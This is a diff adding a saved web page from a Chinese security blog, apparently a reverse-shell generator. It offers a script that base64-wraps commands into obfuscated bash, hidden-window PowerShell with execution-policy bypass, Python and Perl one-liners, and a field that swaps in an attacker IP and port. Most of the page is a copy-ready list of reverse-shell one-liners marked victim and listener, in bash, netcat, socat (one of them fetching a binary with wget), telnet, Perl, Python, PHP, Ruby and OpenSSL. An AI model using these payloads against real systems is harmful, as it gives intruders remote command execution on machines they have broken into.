@@ -1,0 +1,693 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Liqun | Liqun</title><meta name="author" content="Li qun"><meta name="copyright" content="Li qun"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="反弹shell快速生成  function disableScrolling(){     var x&#x3D;window.scrollX;     var y&#x3D;window.scrollY;     window.onscroll&#x3D;function(){window.scrollTo(x, y);}; }  function enableScrolling(){     window">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Liqun">
+<meta property="og:url" content="https://www.ailiqun.xyz/shell.html">
+<meta property="og:site_name" content="Liqun">
+<meta property="og:description" content="反弹shell快速生成  function disableScrolling(){     var x&#x3D;window.scrollX;     var y&#x3D;window.scrollY;     window.onscroll&#x3D;function(){window.scrollTo(x, y);}; }  function enableScrolling(){     window">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post2.webp">
+<meta property="article:published_time" content="2021-05-22T15:40:04.294Z">
+<meta property="article:modified_time" content="2021-05-22T15:39:35.267Z">
+<meta property="article:author" content="Li qun">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post2.webp"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://www.ailiqun.xyz/shell"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//s4.cnzz.com"/><link rel="stylesheet" href="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script async="async" data-pjax="data-pjax" src="https://s4.cnzz.com/z_stat.php?id=1279691978&amp;web_id=1279691978"></script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: false,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2021-05-22 23:39:35'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><link rel="stylesheet" href="/css/鼠标.css"><link rel="stylesheet" href="/css/昵称颜色.css"><link rel="stylesheet" href="/css/页脚透明.css"><link rel="stylesheet" href="/css/滚动条.css"><link rel="stylesheet" href="/css/个性标签.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/sviptzk/StaticFile_HEXO@latest/butterfly/css/font-awesome-animation.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@master/Hexo/css/iconfont.min.css"><link rel="stylesheet" href="https://at.alicdn.com/t/font_2378142_a0rdikziucl.css"><meta name="generator" content="Hexo 5.3.0"></head><body><a href="javascript:void(0);" onclick="preloader.endLoading();" title="！！！！嫌慢就点一下！！！！"><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="scarecrow"><div class="scarecrow__hat"><div class="scarecrow__ribbon"></div></div><div class="scarecrow__head"><div class="scarecrow__eye"></div><div class="scarecrow__eye"></div><div class="scarecrow__mouth"></div><div class="scarecrow__pipe"></div></div><div class="scarecrow__body"><div class="scarecrow__glove scarecrow__glove--l"></div><div class="scarecrow__sleeve scarecrow__sleeve--l"></div><div class="scarecrow__bow"></div><div class="scarecrow__shirt"></div><div class="scarecrow__coat"></div><div class="scarecrow__waistcoat"></div><div class="scarecrow__sleeve scarecrow__sleeve--r"></div><div class="scarecrow__glove scarecrow__glove--r"></div><div class="scarecrow__coattails"></div><div class="scarecrow__pants"></div></div><div class="scarecrow__arms"></div><div class="scarecrow__leg">  </div></div></div></a><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/txx.webp" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">30</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">40</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw iconfont iconcircle"></i><span> 在线工具</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/2022/07/24/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/"><i class="fa-fw iconfont iconhuizong faa-vertical animated"></i><span> 工具汇总入口</span></a></li><li><a class="site-page" href="/#"><span> ----信息收集----</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://x.threatbook.cn/"><i class="fa-fw iconfont iconsaomiao2"></i><span> 微步在线</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://community.riskiq.com/home/"><i class="fa-fw iconfont icon-shuaxin"></i><span> RiskIQ</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://www.virustotal.com/gui/home/url/"><i class="fa-fw iconfont iconbingdu"></i><span> VirusTotal扫毒</span></a></li><li><a class="site-page" href="/#"><span> -资产测绘-</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://fofa.so/"><i class="fa-fw iconfont iconf"></i><span> Fofa  网络安全搜索引擎</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://www.shodan.io/"><i class="fa-fw iconfont iconcircle"></i><span> Shodan网络空间搜索引擎</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://www.zoomeye.org/"><i class="fa-fw iconfont iconyanjing"></i><span> 钟馗之眼-ZoomEye</span></a></li><li><a class="site-page" href="/#"><span> -指纹识别-</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://www.yunsee.cn/"><i class="fa-fw iconfont iconwangzhan"></i><span> 云悉CMS指纹识别平台</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://scan.top15.cn/web/"><i class="fa-fw iconfont iconTx"></i><span> TScan 指纹识别</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw iconfont iconwangzhan"></i><span> 实用小工具</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/%E5%9C%A8%E7%BA%BF%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7"><i class="fa-fw iconfont iconjiemi"></i><span> 在线加解密工具</span></a></li><li><a class="site-page" href="/shell.html"><i class="fa-fw iconfont iconcircle"></i><span> 反弹shell生成</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间排序</span></a></div></div></div></div><div id="body-wrap"><header class="not-home-page" id="page-header" style="background-image: url('https://api.dujin.org/bing/1920.php')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Liqun</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw iconfont iconcircle"></i><span> 在线工具</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/2022/07/24/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/"><i class="fa-fw iconfont iconhuizong faa-vertical animated"></i><span> 工具汇总入口</span></a></li><li><a class="site-page" href="/#"><span> ----信息收集----</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://x.threatbook.cn/"><i class="fa-fw iconfont iconsaomiao2"></i><span> 微步在线</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://community.riskiq.com/home/"><i class="fa-fw iconfont icon-shuaxin"></i><span> RiskIQ</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://www.virustotal.com/gui/home/url/"><i class="fa-fw iconfont iconbingdu"></i><span> VirusTotal扫毒</span></a></li><li><a class="site-page" href="/#"><span> -资产测绘-</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://fofa.so/"><i class="fa-fw iconfont iconf"></i><span> Fofa  网络安全搜索引擎</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://www.shodan.io/"><i class="fa-fw iconfont iconcircle"></i><span> Shodan网络空间搜索引擎</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://www.zoomeye.org/"><i class="fa-fw iconfont iconyanjing"></i><span> 钟馗之眼-ZoomEye</span></a></li><li><a class="site-page" href="/#"><span> -指纹识别-</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://www.yunsee.cn/"><i class="fa-fw iconfont iconwangzhan"></i><span> 云悉CMS指纹识别平台</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://scan.top15.cn/web/"><i class="fa-fw iconfont iconTx"></i><span> TScan 指纹识别</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw iconfont iconwangzhan"></i><span> 实用小工具</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/%E5%9C%A8%E7%BA%BF%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7"><i class="fa-fw iconfont iconjiemi"></i><span> 在线加解密工具</span></a></li><li><a class="site-page" href="/shell.html"><i class="fa-fw iconfont iconcircle"></i><span> 反弹shell生成</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间排序</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="page-site-info"><h1 id="site-title">Liqun</h1></div></header><main class="layout" id="content-inner"><div id="page"><div id="article-container"><!DOCTYPE html>
+<!-- saved from url=(0052)https://ir0ny.top/pentest/reverse-encoder-shell.html -->
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <title>反弹shell快速生成</title>
+<script>
+function disableScrolling(){
+    var x=window.scrollX;
+    var y=window.scrollY;
+    window.onscroll=function(){window.scrollTo(x, y);};
+}
+
+function enableScrolling(){
+    window.onscroll=function(){};
+}
+
+function copy(item_id) {
+  disableScrolling();
+  var copyText = document.getElementById(item_id).textContent;
+  const textArea = document.getElementById('txt');
+  textArea.textContent = copyText;
+  textArea.select();
+  document.execCommand("copy");
+  enableScrolling();
+  return false;
+}
+</script>
+<style type="text/css">
+body{
+font-family: -apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji;
+background-color: #ccc;
+}
+button{
+
+  padding:0 5px;
+  margin:0;
+}
+pre{
+  font-family: SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;
+  font-size:12px;
+  background-color: #F0F8FF;
+  overflow: auto;
+    border: 1px solid #4169E1;
+    padding: 5px;
+}
+.main{
+  max-width:800px;
+  margin:auto;
+  background-color: #fff;
+  padding:15px;
+  border: 1px solid #4169E1;
+}
+input[type=text]{
+  border: 1px solid #898989;
+  font-size:22px;
+width:200px;
+}
+</style>
+</head>
+<body>
+<div class="main">
+    <a target="_blank" rel="noopener" href="https://ailiqun.xyz/">返回主页</a>
+    <h3>命令互转</h3>
+<p>Input type:
+<input type="radio" id="bash" name="option" value="bash" onclick="processInput();" checked=""><label for="bash">Bash</label>
+<input type="radio" id="powershell" name="option" value="powershell" onclick="processInput();"><label for="powershell">PowerShell</label>
+<input type="radio" id="python" name="option" value="python" onclick="processInput();"><label for="python">Python</label>
+<input type="radio" id="perl" name="option" value="perl" onclick="processInput();"><label for="perl">Perl</label></p>
+<p><textarea rows="10" style="width: 100%; box-sizing: border-box;" id="input" placeholder="Type PowerShell here..."></textarea>
+<textarea rows="5" style="width: 100%; box-sizing: border-box;" id="output" onclick="this.focus(); this.select();" readonly=""></textarea></p>
+
+<script>
+  var taInput = document.querySelector('textarea#input');
+  var taOutput = document.querySelector('textarea#output');
+
+  function processInput() {
+    var option = document.querySelector('input[name="option"]:checked').value;
+
+    switch (option) {
+      case 'bash':
+        taInput.placeholder = 'Type Bash here...'
+        taOutput.value = 'bash -c {echo,' + btoa(taInput.value) + '}|{base64,-d}|{bash,-i}';
+        break;
+      case 'powershell':
+        taInput.placeholder = 'Type PowerShell here...'
+        poshInput = ''
+        for (var i = 0; i < taInput.value.length; i++) { poshInput += taInput.value[i] + unescape("%00"); }
+        taOutput.value = 'powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc ' + btoa(poshInput);
+        break;
+      case 'python':
+        taInput.placeholder = 'Type Python here...'
+        taOutput.value = "python -c exec('" + btoa(taInput.value) + "'.decode('base64'))";
+        break;
+      case 'perl':
+        taInput.placeholder = 'Type Perl here...'
+        taOutput.value = "perl -MMIME::Base64 -e eval(decode_base64('" + btoa(taInput.value) + "'))";
+        break;
+      default:
+        taOutput.value = ''
+    }
+
+    if (!taInput.value) taOutput.value = '';
+  }
+
+  taInput.addEventListener('input', processInput, false);
+</script>
+</div>
+
+
+<div class="main">
+IP: <input type="text" id="ip" value="127.0.0.1" name="ip">
+Port: <input type="text" id="port" value="8080" name="port">
+<input type="submit" value="Change" onclick="myFunction()">
+<input type="reset" value="Reset" onclick="myFunction2()">
+<script>
+    function myFunction(){
+      var ip = document.getElementById("ip").value;
+      var port = document.getElementById("port").value;
+      var html= document.body.innerHTML;
+      html=html.replace(/127\.0\.0\.1/g,ip);           
+      html=html.replace(/8080/g,port);
+      document.body.innerHTML=html;
+      taInput = document.querySelector('textarea#input');
+      taOutput = document.querySelector('textarea#output');
+      taInput.addEventListener('input', processInput, false);
+    }
+    function myFunction2(){
+      location.reload();
+    }
+</script>
+
+
+<h3 color="#F5DEB3"> Bash TCP:</h3>
+Victim:
+<pre id="cmd001">bash -i &gt;&amp; /dev/tcp/127.0.0.1/8080 0&gt;&amp;1</pre>
+<button onclick="copy(&#39;cmd001&#39;)">Copy</button>
+<pre id="cmd002">/bin/bash -i &gt; /dev/tcp/127.0.0.1/8080 0&lt;&amp; 2&gt;&amp;1</pre>
+<button onclick="copy(&#39;cmd002&#39;);">Copy</button>
+<pre id="cmd003">exec 5&lt;&gt;/dev/tcp/127.0.0.1/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</pre>
+<button onclick="copy(&#39;cmd003&#39;);">Copy</button>
+<pre id="cmd004">exec /bin/sh 0&lt;/dev/tcp/127.0.0.1/8080 1&gt;&amp;0 2&gt;&amp;0</pre>
+<button onclick="copy(&#39;cmd004&#39;);">Copy</button>
+<pre id="cmd005">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/127.0.0.1/8080; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</pre>
+<button onclick="copy(&#39;cmd005&#39;);">Copy</button>
+
+<h3>Bash UDP:</h3>
+Victim:
+<pre id="cmd006">sh -i &gt;&amp; /dev/udp/127.0.0.1/8080 0&gt;&amp;1</pre>
+<button onclick="copy(&#39;cmd006&#39;);">Copy</button><br>
+Listener:
+<pre id="cmd007">nc -u -lvp 8080</pre>
+<button onclick="copy(&#39;cmd007&#39;);">Copy</button>
+
+<h3>Netcat:</h3>
+<pre id="nc01">nc -e /bin/sh 127.0.0.1 8080</pre>
+<button onclick="copy(&#39;nc01&#39;);">Copy</button>
+<pre id="nc02">nc -e /bin/bash 127.0.0.1 8080</pre>
+<button onclick="copy(&#39;nc02&#39;);">Copy</button>
+<pre id="nc03">nc -c bash 127.0.0.1 8080</pre>
+<button onclick="copy(&#39;nc03&#39;);">Copy</button>
+<pre id="nc04">mknod backpipe p &amp;&amp; nc 127.0.0.1 8080 0&lt;backpipe | /bin/bash 1&gt;backpipe </pre>
+<button onclick="copy(&#39;nc04&#39;);">Copy</button>
+<pre id="nc05">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 127.0.0.1 8080 &gt;/tmp/f</pre>
+<button onclick="copy(&#39;nc05&#39;);">Copy</button>
+<pre id="nc06">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc 127.0.0.1 8080 0/tmp/p 2&gt;&amp;1</pre>
+<button onclick="copy(&#39;nc06&#39;);">Copy</button>
+<pre id="nc07">rm f;mkfifo f;cat f|/bin/sh -i 2&gt;&amp;1|nc 127.0.0.1 8080 &gt; f</pre>
+<button onclick="copy(&#39;nc07&#39;);">Copy</button>
+<pre id="nc08">rm -f x; mknod x p &amp;&amp; nc 127.0.0.1 8080 0&lt;x | /bin/bash 1&gt;x</pre>
+<button onclick="copy(&#39;nc08&#39;);">Copy</button>
+
+<h3>Ncat:</h3>
+<pre id="ncat01">ncat 127.0.0.1 8080 -e /bin/bash</pre>
+<button onclick="copy(&#39;ncat01&#39;);">Copy</button>
+<pre id="ncat02">ncat --udp 127.0.0.1 8080 -e /bin/bash</pre>
+<button onclick="copy(&#39;ncat02&#39;);">Copy</button>
+
+<h3>Telnet:</h3>
+<pre id="telnet01">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet 127.0.0.1 8080 0/tmp/p 2&gt;&amp;1</pre>
+<button onclick="copy(&#39;telnet01&#39;);">Copy</button>
+<pre id="telnet02">telnet 127.0.0.1 8080 | /bin/bash | telnet 127.0.0.1 444</pre>
+<button onclick="copy(&#39;telnet02&#39;);">Copy</button>
+<pre id="telnet03">rm f;mkfifo f;cat f|/bin/sh -i 2&gt;&amp;1|telnet 127.0.0.1 8080 &gt; f</pre>
+<button onclick="copy(&#39;telnet03&#39;);">Copy</button>
+<pre id="telnet04">rm -f x; mknod x p &amp;&amp; telnet 127.0.0.1 8080 0&lt;x | /bin/bash 1&gt;x</pre>
+<button onclick="copy(&#39;telnet04&#39;);">Copy</button>
+
+<h3>Socat:</h3>
+Victim:
+<pre id="socat01">/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:127.0.0.1:8080</pre>
+<button onclick="copy(&#39;socat01&#39;);">Copy</button>
+<pre id="socat02">socat tcp-connect:127.0.0.1:8080 exec:"bash -li",pty,stderr,setsid,sigint,sane</pre>
+<button onclick="copy(&#39;socat02&#39;);">Copy</button><br>
+Listener:
+<pre id="socat03">socat file:`tty`,raw,echo=0 TCP-L:8080</pre>
+<button onclick="copy(&#39;socat03&#39;);">Copy</button>
+<br>
+Victim:
+<pre id="socat04">wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:127.0.0.1:8080</pre>
+<button onclick="copy(&#39;socat04&#39;);">Copy</button>
+
+<h3>Perl:</h3>
+Victim:
+<pre id="perl01">perl -e 'use Socket;$i="127.0.0.1";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</pre>
+<button onclick="copy(&#39;perl01&#39;);">Copy</button>
+
+<pre id="perl02">perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"127.0.0.1:8080");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</pre>
+<button onclick="copy(&#39;perl02&#39;);">Copy</button><br>
+
+Windows only, Victim:
+<pre id="perl03">perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"127.0.0.1:8080");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</pre>
+<button onclick="copy(&#39;perl03&#39;);">Copy</button>
+
+<h3>Python:</h3>
+IP v4
+<pre id="python01">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</pre>
+<button onclick="copy(&#39;python01&#39;);">Copy</button>
+
+<pre id="python02">export RHOST="127.0.0.1";export RPORT=8080;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'</pre>
+<button onclick="copy(&#39;python02&#39;);">Copy</button>
+
+<pre id="python03">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</pre>
+<button onclick="copy(&#39;python03&#39;);">Copy</button>
+
+IP v6
+<pre id="python04">python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",8080,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'</pre>
+<button onclick="copy(&#39;python04&#39;);">Copy</button>
+
+Windows only:
+<pre id="python05">C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('127.0.0.1', 8080)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) &gt; 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"</pre>
+<button onclick="copy(&#39;python05&#39;);">Copy</button>
+
+<h3>PHP:</h3>
+<pre id="php01">php -r '$sock=fsockopen("127.0.0.1",8080);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</pre>
+<button onclick="copy(&#39;php01&#39;);">Copy</button>
+<pre id="php02">php -r '$s=fsockopen("127.0.0.1",8080);$proc=proc_open("/bin/sh -i", array(0=&gt;$s, 1=&gt;$s, 2=&gt;$s),$pipes);'</pre>
+<button onclick="copy(&#39;php02&#39;);">Copy</button>
+<pre id="php03">php -r '$s=fsockopen("127.0.0.1",8080);shell_exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</pre>
+<button onclick="copy(&#39;php03&#39;);">Copy</button>
+<pre id="php04">php -r '$s=fsockopen("127.0.0.1",8080);`/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;'</pre>
+<button onclick="copy(&#39;php04&#39;);">Copy</button>
+<pre id="php05">php -r '$s=fsockopen("127.0.0.1",8080);system("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</pre>
+<button onclick="copy(&#39;php05&#39;);">Copy</button>
+<pre id="php06">php -r '$s=fsockopen("127.0.0.1",8080);popen("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3", "r");'</pre>
+<button onclick="copy(&#39;php06&#39;);">Copy</button>
+
+<h3>Ruby:</h3>
+<pre id="ruby01">ruby -rsocket -e'f=TCPSocket.open("127.0.0.1",8080).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</pre>
+<button onclick="copy(&#39;ruby01&#39;);">Copy</button>
+
+<pre id="ruby02">ruby -rsocket -e 'exit if fork;c=TCPSocket.new("127.0.0.1","8080");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</pre>
+<button onclick="copy(&#39;ruby02&#39;);">Copy</button><br>
+
+NOTE: Windows only
+<pre id="ruby03">ruby -rsocket -e 'c=TCPSocket.new("127.0.0.1","8080");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'</pre>
+<button onclick="copy(&#39;ruby03&#39;);">Copy</button>
+
+
+
+<h3>OpenSSL:</h3>
+Attacker:
+<pre id="ssl01">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</pre>
+<button onclick="copy(&#39;ssl01&#39;);">Copy</button>
+<pre id="ssl02">openssl s_server -quiet -key key.pem -cert cert.pem -port 8080</pre>
